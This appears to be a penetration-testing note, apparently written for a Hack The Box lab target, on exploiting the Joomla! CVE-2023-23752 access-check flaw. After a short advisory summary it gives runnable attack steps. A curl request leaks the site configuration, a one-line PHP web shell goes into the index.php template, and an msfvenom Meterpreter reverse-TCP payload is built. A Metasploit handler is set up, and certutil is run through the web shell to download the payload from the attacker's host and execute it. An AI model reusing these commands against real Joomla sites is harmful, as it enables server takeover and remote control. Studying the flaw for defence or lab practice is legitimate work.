---
description: CVE-2023-23752
---

# Joomla!

{% embed url="https://vulncheck.com/blog/joomla-for-rce" %}

On February 16, 2023, Joomla! published a [security advisory](https://developer.joomla.org/security-centre/894-20230201-core-improper-access-check-in-webservice-endpoints.html) for [CVE-2023-23752](https://nvd.nist.gov/vuln/detail/CVE-2023-23752). The advisory describes an “improper access check” affecting Joomla! 4.0.0 through 4.2.7. The following day, a [chinese-language blog shared](https://xz.aliyun.com/t/12175) the technical details of the vulnerability. The blog describes an authentication bypass that allows an attacker to leak privileged information. If an attacker can log into the Joomla! administrative web interface, as the Super User, the attacker has easy path to execute arbitrary code.

For Information Disclosure, run the following command.&#x20;

```bash
curl 'http://office.htb/api/index.php/v1/config/application?public=true' | jp
```

For RCE, run the following steps. Save it after you modify the index.php template.&#x20;

```bash
<?php if (isset($_GET['cmd'])) system($_GET['cmd']); ?> 
```

<figure><img src="../../.gitbook/assets/image (166).png" alt=""><figcaption></figcaption></figure>

{% code overflow="wrap" %}
```bash
# Meterpreter version

# Create a meterpreter exe
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.9 LPORT=1234 -f exe -o shell1234.exe

# Set up a handler for meterpreter
sudo msfconsole -q -x "use exploit/multi/handler;set PAYLOAD windows/x64/meterpreter/reverse_tcp;set AutoRunScript post/windows/manage/migrate;set LHOST 10.10.14.9;set LPORT 1234;run -j"

# Run the following commands after updating the index.php. 
Kali> curl -k 'http://office.htb/?cmd=certutil%20-urlcache%20-split%20-f%20http://10.10.14.9/shell1234.exe'
Kali> curl -k 'http://office.htb/?cmd=.\shell1234.exe'
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (167).png" alt=""><figcaption></figcaption></figure>
